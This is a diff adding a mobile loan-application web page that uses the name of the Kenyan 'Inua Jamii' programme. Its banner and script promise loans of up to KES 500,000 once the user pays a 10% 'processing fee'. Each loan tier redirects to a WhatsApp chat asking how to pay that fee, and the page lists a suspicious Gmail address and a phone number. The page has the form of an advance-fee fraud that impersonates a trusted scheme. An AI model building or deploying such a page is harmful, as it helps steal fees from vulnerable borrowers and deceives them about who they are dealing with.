@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Inua Jamii — Instant Loan Application</title>
+<style>
+  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  body {
+    font-family: -apple-system, Segoe UI, Roboto, sans-serif;
+    background: linear-gradient(180deg, #f0fdf4 0%, #ecfdf5 100%);
+    margin: 0; padding: 14px; color: #1f2937;
+    min-height: 100vh;
+  }
+  .wrap { max-width: 520px; margin: 0 auto; }
+
+  .header {
+    text-align: center; padding: 18px 12px 14px;
+    background: #fff; border-radius: 14px 14px 0 0;
+    border-top: 5px solid #0f5132;
+    box-shadow: 0 4px 14px rgba(15,81,50,0.08);
+  }
+  .header h1 { margin: 0; color: #0f5132; font-size: 1.6rem; }
+  .header .flag { font-size: 1.4rem; }
+  .header .tag {
+    color: #198754; font-size: 0.68rem; font-weight: 800;
+    letter-spacing: 2px; margin-top: 4px; text-transform: uppercase;
+  }
+
+  .banner {
+    background: #fff; padding: 12px 14px;
+    font-size: 0.82rem; color: #065f46; line-height: 1.5;
+    border-bottom: 1px solid #e5e7eb;
+    text-align: center;
+  }
+  .banner b { color: #0f5132; }
+
+  .tbl-card {
+    background: #fff; border-radius: 0 0 14px 14px;
+    overflow: hidden; box-shadow: 0 4px 14px rgba(15,81,50,0.08);
+  }
+  .tbl-head {
+    background: linear-gradient(135deg, #0f5132, #198754);
+    color: #fff; padding: 12px 14px;
+    font-size: 0.8rem; font-weight: 800;
+    letter-spacing: 0.5px; text-transform: uppercase;
+    display: flex; justify-content: space-between;
+  }
+  .tap-hint {
+    background: #fffbeb; color: #92400e; padding: 10px 14px;
+    font-size: 0.78rem; text-align: center; font-weight: 600;
+    border-bottom: 1px solid #fde68a;
+  }
+  table { width: 100%; border-collapse: collapse; font-size: 0.86rem; }
+  th, td { padding: 13px 10px; text-align: left; }
+  th {
+    background: #f0fdf4; color: #0f5132;
+    font-size: 0.7rem; text-transform: uppercase;
+    letter-spacing: 0.5px; font-weight: 800;
+    border-bottom: 2px solid #d1fae5;
+  }
+  th:nth-child(2), td:nth-child(2),
+  th:nth-child(3), td:nth-child(3) { text-align: right; }
+  tbody tr {
+    border-bottom: 1px solid #f0fdf4; cursor: pointer;
+    transition: background 0.15s;
+  }
+  tbody tr:active { background: #d1fae5; transform: scale(0.99); }
+  tbody tr:hover { background: #f9fafb; }
+  td.amount { font-weight: 800; color: #0f5132; }
+  td.fee { color: #b45309; font-weight: 700; }
+  td.recv { color: #059669; font-weight: 700; }
+  td .arrow {
+    color: #0f5132; font-size: 1.1rem; font-weight: 900;
+  }
+
+  /* Overlay while redirecting */
+  .overlay {
+    display: none; position: fixed; inset: 0;
+    background: rgba(15,81,50,0.92); z-index: 999;
+    color: #fff; text-align: center;
+    padding: 40px 20px;
+    flex-direction: column; align-items: center; justify-content: center;
+  }
+  .overlay.show { display: flex; }
+  .spinner {
+    width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.3);
+    border-top-color: #fff; border-radius: 50%;
+    animation: spin 0.8s linear infinite; margin-bottom: 20px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .overlay h2 { font-size: 1.1rem; margin: 0 0 10px; }
+  .overlay p { font-size: 0.85rem; opacity: 0.9; max-width: 320px; line-height: 1.5; }
+  .overlay .fallback {
+    margin-top: 24px; font-size: 0.8rem; opacity: 0.85;
+    text-decoration: underline; color: #fff; cursor: pointer;
+  }
+
+  .footer {
+    text-align: center; margin-top: 22px; padding: 14px;
+    font-size: 0.72rem; color: #9ca3af; line-height: 1.7;
+  }
+  .footer a { color: #0f5132; text-decoration: none; font-weight: 700; }
+  .footer .contact-line {
+    display: flex; gap: 10px; justify-content: center;
+    margin-top: 6px; flex-wrap: wrap;
+  }
+  .footer .contact-line a {
+    background: #f0fdf4; padding: 6px 12px;
+    border-radius: 99px; font-size: 0.72rem;
+    border: 1px solid #d1fae5;
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="header">
+    <h1><span class="flag">🇰🇪</span> Inua Jamii</h1>
+    <div class="tag">Fast · Transparent · Trusted</div>
+  </div>
+
+  <div class="banner">
+    Tap your loan amount below. You will be <b>connected instantly to our support team</b>
+    to approve your loan. Pay the <b>10% processing fee</b> and receive the
+    <b>full amount</b> on M-Pesa.
+  </div>
+
+  <div class="tbl-card">
+    <div class="tbl-head">
+      <span>Select Loan Amount</span>
+      <span>→ Support</span>
+    </div>
+    <div class="tap-hint">👇 Tap a row to be connected to support instantly</div>
+    <table>
+      <thead>
+        <tr>
+          <th>Loan Amount</th>
+          <th>Processing Fee</th>
+          <th>You Receive</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody id="loanTable"></tbody>
+    </table>
+  </div>
+
+  <div class="footer">
+    Inua Jamii · Person-to-Person Loan Service<br>
+    <div class="contact-line">
+      <a href="mailto:genuinehookupconnection@gmail.com">📧 Email</a>
+      <a href="https://wa.me/254756793097" target="_blank">💬 WhatsApp</a>
+      <a href="tel:+254756793097">📞 Call</a>
+    </div>
+  </div>
+</div>
+
+<!-- Redirect overlay -->
+<div class="overlay" id="overlay">
+  <div class="spinner"></div>
+  <h2>Connecting to Support…</h2>
+  <p id="overlayMsg">Opening your chat with the Inua Jamii support team.</p>
+  <div class="fallback" id="fallbackBtn">Tap here if nothing happens</div>
+</div>
+
+<script>
+  /* ============================================================
+     ✏️ SUPPORT CONTACT — change here if details change
+     ============================================================ */
+  const SUPPORT_EMAIL = "genuinehookupconnection@gmail.com";
+  const SUPPORT_PHONE = "+254756793097";     // international format for tel: + sms:
+  const SUPPORT_WHATS = "254756793097";      // no + for WhatsApp
+
+  /* ============================================================
+     LOAN TIERS — fee is always 10%
+     ============================================================ */
+  const LOAN_TIERS = [
+    1000, 2000, 3000, 5000, 10000, 15000, 20000, 25000, 30000,
+    40000, 50000, 75000, 100000, 150000, 200000, 250000, 300000,
+    400000, 500000
+  ];
+  const FEE_RATE = 0.10;
+
+  const fmt = n => "KES " + Math.round(n).toLocaleString('en-KE');
+  const tbody = document.getElementById('loanTable');
+
+  LOAN_TIERS.forEach(amount => {
+    const fee = amount * FEE_RATE;
+    const tr = document.createElement('tr');
+    tr.innerHTML = `
+      <td class="amount">${fmt(amount)}</td>
+      <td class="fee">${fmt(fee)}</td>
+      <td class="recv">${fmt(amount)}</td>
+      <td style="text-align:center;"><span class="arrow">→</span></td>
+    `;
+    tr.addEventListener('click', () => redirectToSupport(amount));
+    tbody.appendChild(tr);
+  });
+
+  function redirectToSupport(amount) {
+    const fee = amount * FEE_RATE;
+
+    const message =
+      `Hello Inua Jamii Support,\n\n` +
+      `I would like to apply for a loan.\n\n` +
+      `Loan Amount: ${fmt(amount)}\n` +
+      `Processing Fee: ${fmt(fee)}\n` +
+      `Amount to Receive: ${fmt(amount)}\n\n` +
+      `Please advise on how to pay the processing fee so my loan can be approved and disbursed to my M-Pesa.`;
+
+    const encoded = encodeURIComponent(message);
+    const waLink = `https://wa.me/${SUPPORT_WHATS}?text=${encoded}`;
+
+    // Show overlay
+    const overlay = document.getElementById('overlay');
+    document.getElementById('overlayMsg').textContent =
+      `Opening chat with support for a ${fmt(amount)} loan…`;
+    overlay.classList.add('show');
+
+    // Attempt redirect to WhatsApp
+    setTimeout(() => {
+      window.location.href = waLink;
+
+      // Fallback: if nothing happened after 2.5s, show manual button
+      setTimeout(() => {
+        const fb = document.getElementById('fallbackBtn');
+        fb.textContent = "Open WhatsApp manually";
+        fb.onclick = () => window.open(waLink, '_blank');
+      }, 2500);
+    }, 400);
+  }
+</script>
+</body>
+</html>
